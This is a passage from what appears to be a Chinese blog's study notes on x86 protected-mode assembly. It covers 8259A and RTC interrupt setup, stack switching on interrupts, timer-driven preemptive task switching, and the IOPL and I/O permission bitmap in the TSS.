src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/23d57fbce03a1e104a6cd035237449ad.png" class=""><p>代码如下：</p><pre><code class="assembly">    ;设置8259A中断控制器    mov al,0x11    out 0x20,al                        ;ICW1：边沿触发/级联方式    mov al,0x20    out 0x21,al                        ;ICW2:起始中断向量    mov al,0x04    out 0x21,al                        ;ICW3:从片级联到IR2    mov al,0x01    out 0x21,al                        ;ICW4:非总线缓冲，全嵌套，正常EOI        mov al,0x11    out 0xa0,al                        ;ICW1：边沿触发/级联方式    mov al,0x70    out 0xa1,al                        ;ICW2:起始中断向量    mov al,0x04    out 0xa1,al                        ;ICW3:从片级联到IR2    mov al,0x01    out 0xa1,al                        ;ICW4:非总线缓冲，全嵌套，正常EOI</code></pre><p>之后设置和时钟中断相关的硬件：</p><pre><code class="assembly">    ;设置和时钟中断相关的硬件    mov al,0x0b;RTC寄存器B    or al,0x80          ;阻断NMI    out 0x70,al    mov al,0x12         ;设置寄存器B，禁止周期性中断，开放更    out 0x71,al         ;新结束后中断，BCD码，24小时制        in al,0xa1          ;读8259从片的IMR寄存器    and al,0xfe         ;清除bit 0(此位连接RTC)    out 0xa1,al         ;写回此寄存器        mov al,0x0c    out 0x70,al    in al,0x71          ;读RTC寄存器C，复位未决的中断状态</code></pre><h2 id="09-中断和异常发生似的特权级检查"><a href="#09-中断和异常发生似的特权级检查" class="headerlink" title="09. 中断和异常发生似的特权级检查"></a>09. 中断和异常发生似的特权级检查</h2><p>接上一节，目前中断描述符表已经创建，在这个表中，所有与中断、异常相关的描述符已经安装完毕。包括<mark>0x70号中断</mark>，其中断门已经安装完毕，指向其自己的中断处理过程。</p><p>接下来开中断，讲标志寄存器<mark>IF</mark>位置1，那么中断就可以随时进来。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/322fd7154dbaeccf68c9b55f409709b7.png" class=""><p>当中断发生时，处理器从软中断指令、或中断控制器芯片取得中断向量。用这个向量从中断描述符表<strong>IDT</strong>中取出中断门、陷阱门、任务门，但是中断向量只是一个代表中断号码的数字，没有表指示器、<strong>RPL</strong>字段，所以中断和异常发生时不检查<strong>RPL</strong>字段；</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/36d0e5a120263624bae1c2858c3332db.png" class=""><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/03e4ed8fdb2ef8b212b089f9594fcc49.png" class=""><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f2812cf72dc369391ac07c63b3f41e95.png" class=""><h2 id="10-中断和异常发生时的栈切换过程"><a href="#10-中断和异常发生时的栈切换过程" class="headerlink" title="10. 中断和异常发生时的栈切换过程"></a>10. 中断和异常发生时的栈切换过程</h2><p>当中断发生时，处理器使用中断向量乘以8，到<strong>IDTR</strong>指定的中断描述符表<strong>IDT</strong>中取出一个描述符；</p><p>去除的描述符可能是中断门、陷阱门和任务门，中断门、陷阱门会转去执行中断处理程序，任务门会进行一个任务切换，本章并不是使用这种方式进行任务切换。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/8d8fc85f4918195b657b13bce9ecdb76.png" class=""><ol><li>若目标代码段的特权级等于当前代码段的特权级，则使用当前代码段的栈，即中断和异常发生前正在使用的栈。</li><li>若目标代码段的特权级大于当前代码段的特权级，则处理器会切换到目标代码段的栈，那么这个新栈来自于当前任务的<strong>TSS</strong>中。从中选取一个和目标代码段相同特权级的栈。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/6bbffc572736523b0dae80c2f7e4af88.png" class="">当中断或异常发生时，若当前特权级<strong>CPL</strong>和目标代码段特权级<strong>DPL</strong>不同，则系统中必须至少存在一个任务。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/53ebd2ffd1f4494590783b20c4f37c65.png" class=""></li></ol><ul><li>当前任务如上，若当前正在<strong>代码段2</strong>执行，则发生中断或异常，则切换到<strong>代码段1</strong>执行，且不需要切换栈。</li><li>若当前正在<strong>代码段3</strong>执行，则发生中断或异常，则切换到<strong>代码段1</strong>执行，此时需要切换栈</li></ul><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/67c03f5323edfd9544c0235661096d39.png" class=""><ol><li>首先临时保存段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>；</li><li>根据目标代码的特权级，从当前任务的<strong>TSS</strong>中选取一个栈段指针加载到栈指针<strong>ESP</strong>；</li><li>将选择的栈段选择子加载到段寄存器<strong>SS</strong>，将选择的栈指针加载到<strong>ESP</strong>；</li><li>切换到新栈，将刚才临时保存的段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>压入新栈；</li><li>接着将<strong>EFLAGS</strong>、<strong>CS</strong>、<strong>EIP</strong>压入新栈；</li><li>对于有错误代码的异常，处理器还要将错误代码压入新栈；</li><li>当中断返回时，要将<strong>EFLAGS</strong>、<strong>CS</strong>、<strong>EIP</strong>恢复，还将恢复原来的栈状态，即恢复之前临时保存的段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>；</li><li>恢复之后段寄存器依然指向旧栈段，栈指针寄存器<strong>ESP</strong>依然指向进入中断之前的位置。</li></ol><p>中断门和陷阱门的区别不大，通过中断门进入中断处理过程时，处理器先将<strong>EFLAGS</strong>压栈，再将其<strong>IF</strong>位清零以禁止嵌套的中断，即进入中断处理程序后不允许再响应别的中断。从中断返回时，将从栈中恢复<strong>EFLAGS</strong>的原始状态。</p><p>陷阱门的优先级较低，通过陷阱门进入中断处理过程时，<strong>EFLAGS</strong>的IF位不变，以允许其它中断优先处理。<strong>EFLAGS</strong>的<strong>IF</strong>位只影响硬件中断，不影响<strong>NMI</strong>、异常、INT形式的软中断。</p><p>错误代码格式：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/06739af9c2e734f283fc024ed041df76.png" class=""><ul><li><strong>EXT位</strong>：1表示由<strong>NMI</strong>、硬件中断等引发；</li><li><strong>IDT位</strong>：1表示段选择子索引指向中断描述符<strong>IDT</strong>中的门描述符，0表示指向<strong>GDT</strong>、<strong>LDT</strong>中的描述符；</li><li><strong>TI位</strong>：表示指示器，当<strong>IDT</strong>位 = 0才有意义。0表示段选择子索引指向<strong>GDT</strong>，1表示指向<strong>LDT</strong>中的段描述符或门描述符；</li><li><strong>段选择子索引</strong>：用于指示<strong>GDT</strong>或<strong>LDT</strong>中的段描述符、或<strong>IDT</strong>内的门描述符。就是段选择子的高13位用于索引描述符。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/02c3a1acd2107868868cf3d50a36ffaa.png" class=""></li></ul><h2 id="11-在中断处理过程中实施任务切换（含NOP指令的介绍）"><a href="#11-在中断处理过程中实施任务切换（含NOP指令的介绍）" class="headerlink" title="11. 在中断处理过程中实施任务切换（含NOP指令的介绍）"></a>11. 在中断处理过程中实施任务切换（含NOP指令的介绍）</h2><p>接上一节，接着开放中断：</p><pre><code class="assembly">        sti;开放硬件中断</code></pre><p>假定在执行指令<mark>mov ebx, message_0<mark>时发生<strong>0x70号中断</strong>，这条指令完成后立即响应中断，用中断号0x70乘以8到中断描述符表中取出中断门进行特权级检查，然后进入<strong>0x70</strong>号中断的处理过程执行。</mark></mark></p><p>此时还没有创建内核任务，那么TR中的内容是无效的，因为<strong>0x70</strong>号中断的处理过程在内核公共例程段，特权级为0，当前特权级也是0，所以不需要切换栈，自然也不需要访问任务状态段<strong>TSS</strong>。</p><p><strong>0x70</strong>号中断的处理过程：</p><pre><code class="assembly">;-------------------------------------------------------------------------------rtm_0x70_interrupt_handle:             ;实时时钟中断处理过程    pushad        mov al,0x20                        ;中断结束命令EOI    out 0xa0,al                        ;向8259A从片发送    out 0x20,al                        ;向8259A主片发送        mov al,0x0c                        ;寄存器C的索引。且开放NMI    out 0x70,al    in al,0x71                         ;读一下RTC的寄存器C，否则只发生一次中断                  ;此处不考虑闹钟和周期性中断的情况    ;请求任务调度    call sys_routine_seg_sel:initiate_task_switch        popad        iretd</code></pre><p>之后的内容为：</p><ul><li>显示处理器品牌信息；</li><li>安装调用门，对门进行测试；</li><li>创建内核任务相关，在创建之前使用<strong>cli</strong>指令清中断，之后<strong>sti</strong>指令开放中断；</li><li>创建第一个用户任务，在创建之前使用<strong>cli</strong>指令清中断，之后<strong>sti</strong>指令开放中断；<ol><li>在开放中断之后，若立即发生了<strong>0x70</strong>号中断，将执行任务切换，首先执行<mark>rtm_0x70_interrupt_handle</mark>，在里面先保存当前内核任务的状态到内核任务<strong>TSS</strong>中，接着将用户任务的状态从其<strong>TSS</strong>中恢复到处理器中，TR就指向用户任务，用户任务就成了当前任务。</li><li>第一次执行用户任务从入口点执行，先切换栈在死循环打印<mark>，，，，，，</mark>，在执行<mark>jmp .do_prn</mark>指令之前若发生了<strong>0x70</strong>号中断，又转到<mark>rtm_0x70_interrupt_handle</mark>执行；</li><li>这一次用户任务时当前任务，找到就绪的内核任务，先保存当前的任务也就是用户任务的状态到其<strong>TSS</strong>，然后将内核任务的状态从其<strong>TSS</strong>中恢复到处理器。此时<strong>TR</strong>指向内核任务，内核任务成为当前任务。内核任务从下面返回：<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b98070cf32d38af1095d692179618875.png" class=""></li></ol></li></ul><p>因为之前内核任务是从这里切换出去的，然后<strong>retf</strong>返回到中断处理过程<mark>rtm_0x70_interrupt_handle</mark>，如下：返回到<strong>popad</strong>指令处。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/5332d252c92ab03ba05f620d2d165454.png" class=""><p>再执行<mark>iretd</mark>从中断处理过程返回到内核任务中上一次<strong>0x70</strong>号中断的地方，即内核<strong>start</strong>里面的nop指令处：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/7e6e29824e3d95591e20eeb190f3c945.png" class=""><p>添加<strong>nop</strong>指令的意图是，假定在执行这三条<strong>nop</strong>指令期间发生了<strong>0x70</strong>号中断，于是处理器又一次在内核任务中中执行中断处理过程</p><p>之后顺序执行代码即可。</p><p>其中<strong>nop</strong>指令：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/61a9d56175641a5edbf7407f56f60a6a.png" class=""><p>在调试期间，可能需要动态修改一个正在执行的程序，例如我们想把<mark>08 c9</mark>这条跳转指令去掉又不影响其它指令，此时最好的办法就是将其修改为<mark>90 90</mark>。</p><h2 id="12-抢占式多任务的执行效果演示"><a href="#12-抢占式多任务的执行效果演示" class="headerlink" title="12. 抢占式多任务的执行效果演示"></a>12. 抢占式多任务的执行效果演示</h2><p>接上一节，执行<strong>nop</strong>指令之后继续创建第二个用户任务：</p><pre><code class="assembly">    ;为说明任务切换而特意添加的无操作指令    nop    nop    nop        ;可以创建更多的任务，例如：    cli    mov ecx,0x46    call sys_routine_seg_sel:allocate_memory    mov word [es:ecx+0x04],0           ;任务状态：空闲    call append_to_tcb_link            ;将此TCB添加到TCB链中        push dword 100                     ;用户程序位于逻辑100扇区    push ecx                           ;压入任务控制块起始线性地址        call load_relocate_program    sti</code></pre><p>之后的内核任务是一个无限循环：</p><pre><code class="assembly">.do_switch:    mov ebx,core_msg2    call sys_routine_seg_sel:put_string        ;清理已经终止的任务，并回收它们占用的资源    call sys_routine_seg_sel:do_task_clean        hlt        jmp .do_switch</code></pre><p>程序加载：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/5a7cfbe8d5a437a0aaf077939a037602.png" class=""><p>虚拟机执行：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b5657e47353d532e0cfe1989136f34ba.png" class=""><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/image-20221113165929743.png" class="" title="image-20221113165929743">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>29. 协同式任务切换</title>
      <link href="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/"/>
      <url>/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="01-任务和任务切换概述"><a href="#01-任务和任务切换概述" class="headerlink" title="01. 任务和任务切换概述"></a>01. 任务和任务切换概述</h2><p>多任务系统中，每个任务都有自己的任务状态段<strong>TSS</strong>和局部描述符表<strong>LDT</strong>，当前任务是由任务寄存器<strong>TR</strong>指示，指向当前任务的任务状态段<strong>TSS</strong>、局部描述符表寄存器<strong>LDTR</strong>也指向当前局部描述符表<strong>LDT</strong>。</p><span id="more"></span><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ecaeb5708d898aabbeb7135046099657-166832967486710.png" class=""><p>多任务系统是指可以同时执行两个或者两个以上任务的系统，即使一个任务没有执行完也可以执行下一个任务，多任务切换时<strong>TR</strong>和<strong>LDTR</strong>也要切换到新的任务中。</p><p>多任务切换方式：</p><ol><li><mark>协同式任务切换</mark>：需要当前任务主动请求暂时放弃执行权、或者在通过调用门请求操作系统服务时由操作系统乘机切换到另一个任务中。因此这种方式很依赖于当前执行任务的自律性，当一个任务失控时可能其它任务都得不到执行的机会。</li><li><mark>抢占式任务切换</mark>：这种方式可以安装一个定时器中断，在中断信号产生的时候进行任务切换。硬件中断会定时发生，不管处理器在做什么，当产生中断时任务一定会执行切任务换操作，这样所有任务都有平等的执行机会，当一个任务失控时也不会导致其他任务没有机会执行。</li></ol><p>多任务系统：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/dcc158c41bd25560420ed9ac91e93f1f-16683296748674.png" class=""><p>任务的组成是灵活的，不一定由不同的特权级组成，也不一定由内核和用户程序组成<br>例如本章将创建三个任务：</p><ol><li>任务1由单独的内核组成，0特权级。内核除了是一个单独的任务，也是其他任务的全局部分。</li><li>任务2由任务2的私有部分和内核组成，其是3特权级。</li><li>任务3由任务3的私有部分和内核组成，其也是3特权级。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/5c5fc3fa7fc5bf7b45bc94e33216aae7-16683296748671.png" class=""></li></ol><p>在本章中，当处理器加电复位之后，进入保护模式之后就直接创建和执行内核的0特权级任务→之后切换到任务2的私有部分→之后切换到内核→之后切换到任务3的私有部分。</p><p>每个任务都有自己的状态，特别是当一个任务再执行时，所有段寄存器和通用寄存器都和当前任务息息相关。段寄存器指向当前任务自己的段，通用寄存器保存着当前任务执行的数据和临时结果、标志寄存器保存着当前任务执行产生的各个标志位。</p><p>当前任务要切换出去，必须将当前任务的所有状态都保存起来以便将来恢复，这叫做保护现场。被切换到的那个任务也必须恢复到原先它被打断时的状态，叫做恢复现场。</p><p>为了保护现场和恢复现场，使用每个任务的<strong>TSS</strong>来保存数据：<strong>CR3</strong>和分页有关。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9338fcfaa209df58ccd8cec9796059a9-16683296748672.png" class=""><p>保存当前任务的现场：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/00af7da67920361a23086cf9741893e9-16683296748673.png" class=""><p>恢复目标任务的现场：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/da3677ea1fab46deb7cd37f467754371-16683296748675.png" class=""><p>恢复之后被切换到的任务变成当前任务。</p><h2 id="02-内核任务的创建和当前I-x2F-O特权级LOPL"><a href="#02-内核任务的创建和当前I-x2F-O特权级LOPL" class="headerlink" title="02. 内核任务的创建和当前I/O特权级LOPL"></a>02. 内核任务的创建和当前I/O特权级LOPL</h2><p>本章程序：<br>引导程序：<strong>c13_mbr0.asm</strong>，加载执行内核。<br>内核程序：<strong>c15_core0.asm</strong>，加了新的内容。<br>用户程序：<strong>c15_app0.asm</strong>，加了新的内容。</p><p><strong>I/O许可位图</strong>，之前讲过特权指令，即只有<strong>0特权级</strong>才能执行的指令。但是有一些低特权级的程序也需要使用这些指令。<br>如下：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d0448a72f4c8a35a954f62f55b5e880c-16683296748676.png" class=""><p>为了控制哪些任务能够访问硬件端口，需要用到标志寄存器EFLAGS：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/c00656182066503226da7f091421e2e7-16683296748679.png" class=""><p>当前特权级<strong>CPL</strong>若高于<strong>IOPL（I/O Privilege Level)<strong>，数值上</strong>CPL ≤ IOPL</strong>，则表示所有<strong>I/O</strong>访问都是被允许的。</p><h2 id="03-I-x2F-O特权级的修改和POPF指令"><a href="#03-I-x2F-O特权级的修改和POPF指令" class="headerlink" title="03. I/O特权级的修改和POPF指令"></a>03. I/O特权级的修改和POPF指令</h2><p>标志寄存器中的标志是会随着任务的执行而改变的，比如：<strong>ZF、CF</strong>；有些则需要特定的指令来改变，比如<strong>DF</strong>。但是<strong>IOPL</strong>不会自动随程序修改，也没有特定的指令来修改，修改<strong>IOPL</strong>需要执行以下操作：</p><ol><li><p>先将标志寄存器压栈</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/2e1ea44696421df22f3de6cd05dc5fb3-16683296748677.png" class=""><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/f6e06e2f34d89404d6261e892f7ce7a8-16683296748678.png" class=""></li><li><p>然后对栈中<strong>IOPL</strong>内容进行修改</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/b877b21342d7e33e4f1c856eb51594ae-166832967486711.png" class=""><p>将<strong>IOPL</strong>修改为01。</p></li><li><p>最后将栈中修改后的内容弹出到寄存器。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/91176a8596b09cbe9383b772a9bf48a4-166832967486712.png" class=""><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d251cfc7ef40c8161ed1675c33700695-166832967486714.png" class=""></li></ol><h2 id="04-任务的用户态和内核态"><a href="#04-任务的用户态和内核态" class="headerlink" title="04. 任务的用户态和内核态"></a>04. 任务的用户态和内核态</h2><p>每个任务都有<strong>TSS</strong>，其中保存了<strong>EFLAGS</strong>，有<strong>IOPL</strong>字段。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/acf15bb6736f7490e9dcfd1a55b9f4d8-166832967486713.png" class=""><p>多任务系统特点：可以在内核任务和用户任务之间来回切换、也可以再两个任务之间来回切换。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/718352e49749237d68e1c4ba568a88a1-166832967486715.png" class=""><p>每当一个任务被切换回后台时，它与之相关的状态都会保存再它的<strong>TSS</strong>中，当它恢复时，会从它的<strong>TSS</strong>中将各种状态恢复到处理器中。显然每个任务都受自己的<strong>IOPL</strong>所限制。</p><p>每个任务都可以对自己的标志和状态进行修改，比如标志寄存器中的内容，需要使用如下指令进行压栈、修改、再出栈返回到标志寄存器中。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/41bea40aa66420d64e1fdbac1aa21dc5-166832967486716.png" class=""><p>其中<mark>pushf、pushfd</mark>在任务特权级下均可执行，但是<mark>popf、popfd</mark>执行时标志寄存器中的有些标志位是否会受到影响（如IOPL字段)是否能被修改则取决于当前特权级<strong>CPL</strong>：</p><ol><li>CPL为0，那么执行<mark>popf、popfd</mark>指令时，标志寄存器的<mark>IOPL</mark>字段会被修改；</li><li>CPL为1，那么执行<mark>popf、popfd</mark>指令时，标志寄存器的<mark>IOPL</mark>字段类似于<strong>只读</strong>，不会受到影响；</li></ol><p>即低特权级指令无法使用<mark>popf、popfd</mark>指令修改<mark>IOPL</mark>字段。<mark>popf、popfd</mark>并不是特权指令，特权指令是只能在0特权级下执行，<mark>popf、popfd</mark>指令在低特权级下也可以执行，只不过在低特权级下执行时一些标志位不受其影响。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/bbef20148f7a47065143878328f53ea9-166832967486717.png" class=""><p>内核任务只能在内核态执行，用户任务可以在内核态和用户态中执行。</p><h2 id="05-I-x2F-O许可位串和TSS的I-x2F-O许可位映射区"><a href="#05-I-x2F-O许可位串和TSS的I-x2F-O许可位映射区" class="headerlink" title="05. I/O许可位串和TSS的I/O许可位映射区"></a>05. I/O许可位串和TSS的I/O许可位映射区</h2><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9e36bd13dc99727a853f3386f567ae47-166832967486718.png" class=""><p>当前<strong>CPL</strong>高于等于<strong>IOPL</strong>（数值上CPL ≤ IOPL），则所有<strong>I/O</strong>操作都是被允许的；<br>当前<strong>CPL</strong>低于<strong>IOPL</strong>（数值上CPL ≥ IOPL），也并非意味着所有<strong>I/O</strong>操作都是不被允许的，而是需要进一步指定哪些允许，哪些不允许。在输入输出（I/O许可位串）中指定。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/49ba689fa14560fdabc76ff3a3d24938-166832967486819.png" class=""><p>TSS中基本长度是104字节，当然也可以包括I/O许可位映射区</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ac052aceeb0186b956372984e4100f67-166832967486820.png" class=""><p><strong>TSS</strong>描述符及其布局：其中段界限是包括<strong>I/O许可位映射区</strong>的。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/dc6036897ff49aeebec6d08d4e222444-166832967486821.png" class=""><p>其中<strong>I/O许可位的偏移M</strong>若大于<strong>TSS</strong>描述符的段界限，则意味着没有<strong>I/O许可位</strong>。在这种情况下，如果当前<strong>CPL ≥ IOPL</strong>，就意味着必须检查<strong>I/O许可位串</strong>，但是没有<strong>I/O</strong>许可位串就意味着不允许访问硬件端口，执行任何硬件I/O指令都会引发处理器的异常中断。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/0bd3c3d8808b9315f7a79ceb4e3209a5-166832967486822.png" class=""><p>处理器检查<strong>I/O</strong>许可位方法如下：</p><ol><li>先根据端口号计算它在<strong>I/O</strong>许可位映射区的哪个字节中；</li><li>然后读取该字节，并测试那个<strong>byte</strong>位，<br>如<strong>out 0x09, al</strong>指令：端口<strong>0x09</strong>位于第二个<strong>byte</strong>，而且位于第二个字节的<strong>位1</strong>.处理器读取并测试这个<strong>byte位</strong>是0还是1来决定是否允许执行这个<strong>out</strong>指令。</li></ol><p>I/O端口是按照字节编址的，即每个端口只能用来读取一个字节的数据，那些多字节的端口其实是合并了几个端口组成一个多字节端口的：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ff8895b5ee0a42a472ea2ed58c2914cc-166832967486823.png" class=""><p>由于<strong>I/O端口</strong>是按照字节编址的原因，当处理器执行一个字或者双字的<strong>I/O</strong>指令时，会检查许可位串中的2个或者4个连续的<strong>byte</strong>，而且要求它们必须都是0，否则引发异常中断。</p><p>麻烦在于这些连续的<strong>byte</strong>有可能是跨字节的，即一些<strong>byte</strong>位于前一个字节有些位于后一个字节，<br>如下：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/67391e2a303f4dec1de5a884b13b9704-166832967486824.png" class=""><p>所以处理器每次都从<strong>I/O许可位映射区</strong>读取2个连续的字节，而不是1个字节。</p><p>这种操作方式也导致了另一个问题，即要检查的<strong>byte</strong>如果在最后一个字节中这样的读操作就会导致越界。为了防止这种情况发生处理器要求<strong>I/O许可位映射区</strong>最后必须附加一个额外的字节，其值为<strong>0xFF</strong>。<br>如下：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ef823bfa7f5ca793b66e36664ede8de5-166832967486825.png" class=""><p>若<strong>I/O许可映射区</strong>本身只有11个字节，除去最后一位<strong>0xFF</strong>，只剩下10个字节，那么只能映射80个端口，访问更高地址的端口（高于79号端口）将引发异常中断。</p><img 